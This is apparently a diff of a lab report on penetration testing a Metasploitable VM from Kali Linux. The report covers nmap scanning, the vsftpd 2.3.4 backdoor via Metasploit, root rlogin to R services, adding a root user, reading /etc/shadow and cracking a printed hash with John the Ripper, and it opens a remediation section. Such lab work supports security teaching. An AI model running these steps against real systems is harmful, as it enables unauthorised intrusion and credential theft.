@@ -1,16 +1,25 @@
 Network Penetration Testing with Real-
 World Exploits
 and Security Remediation
+
+
+
 Project objectives –
 The objective of this project is to simulate real-world network penetration testing in
 a Controlled environment using Kali Linux and a vulnerable Metasploitable VM. It
 includes Scanning, reconnaissance, enumeration, exploitation, user privilege
 escalation, password Cracking, and providing remediation.
+
+
+
 Introduction –
 Penetration testing is a critical component in identifying vulnerabilities and
 assessing the security posture of systems. This project involves ethical hacking
 techniques to exploit and analyze a target system. It replicates real-world exploitation
 techniques to uncover system weaknesses and recommend appropriate remediations.
+
+
+
 Theory About the Project –
 Network penetration testing is the process of evaluating a system’s network
 security by simulating Attacks from malicious outsiders and insiders. The goal is to find
@@ -22,10 +31,16 @@ security loopholes before attackers Do. It includes multiple phases:
 5. Privilege Escalation – Creating a new user with elevated privileges.
 6. Password Cracking – Retrieving passwords from captured hashes.
 7. Remediation – Providing fixes and updates for identified vulnerabilities.
+
+
 Project requirements –
 Two Operating System-
 1. Kali Linux (Attacking machine)
 2. Metasploitable machine ( Target Machine)
+
+
+
+
 Tools Details:
 • Kali Linux - The attacker machine, containing pre-installed penetration testing
 tools.
@@ -37,6 +52,8 @@ on the target.
 • John the Ripper - For cracking hashed passwords obtained from /etc/shadow
 • Netcat
 • VM Manager (VirtualBox/VMware)
+
+
 Tasks
 Network Scanning
 Task 1: Basic Network Scan
@@ -44,6 +61,9 @@ Step 1: Open a terminal on your Kali Linux machine.
 Step 2: Run a basic scan on your local network.
 Nmap -v YOUR_IP_RANGE
 • nmap -v 192.168.160.131
+
+
+
 Task 2 – Reconnaissance
 Task 1: Scanning for hidden Ports
 Step 1: To scan for hidden ports , we have to scan whole range of ports on that specific
@@ -60,11 +80,16 @@ List of hidden ports
 5. 59437
 6. 3632
 7. 6697
+
+
+
 Task 2: Service Version Detection
 Step 1: Use the -sV option to detect the version of services running on open ports:
 nmap -v -sV YOUR_TARGET_IP_ADDRESS
 • nmap -v -sV 192.168.160.131
 Output:
+
+
 Task 3: Operating System Detection
 Step 1: Use the -O option to detect the operating systems of devices on the network:
 Nmap -v -O YOUR_TARGET_IP_ADDRESS
@@ -123,6 +148,9 @@ Hidden Ports with Service Versions (ONLY HIDDEN PORTS)
 5. 36571/tcp open nlockmgr 1-4 (RPC #100021)
 6. 44585/tcp open java-rmi GNU Classpath grmiregistry
 7. 51228/tcp open status 1 (RPC #100024)
+
+
+
 Task 4- Exploitation of services
 1. vsftpd 2.3.4 (Port 21 - FTP)
 • msfconsole
@@ -140,6 +168,8 @@ Task 4- Exploitation of services
 3. Exploiting R Services (Port 512,513,514)
 • nmap -p 512,513,514 -sC -sV –script=vuln 192.168.160.131
 • rlogin -l root 192.168.160.131
+
+
 Task 5 - Create user with root permission
 adduser your_name
 Set a simple password example 12345 or hello or 987654321
@@ -153,10 +183,14 @@ Enter details of the new user you have added in Metasploit
 • sudo cat /etc/shadow | grep minakshi0x ra
 • minakshi:$y$j9T$ep3Qv2Hy8a5uO71kK7yOm0$rxMKpQlW2n/XflTYSpcCljAKbKR
 OVgZHXHr50E5ed.4:20223:0:99999:7:::
+
+
 Task 6 – Cracking password hashes
 • nano minakshi_hash.txt
 • /john minakshi_hash.txt
 • /john minakshi_hash.txt –show
+
+
 Task 7 – Remediation
 1. FTP Service (vsftpd)
 • Current Version: vsftpd 2.3.4
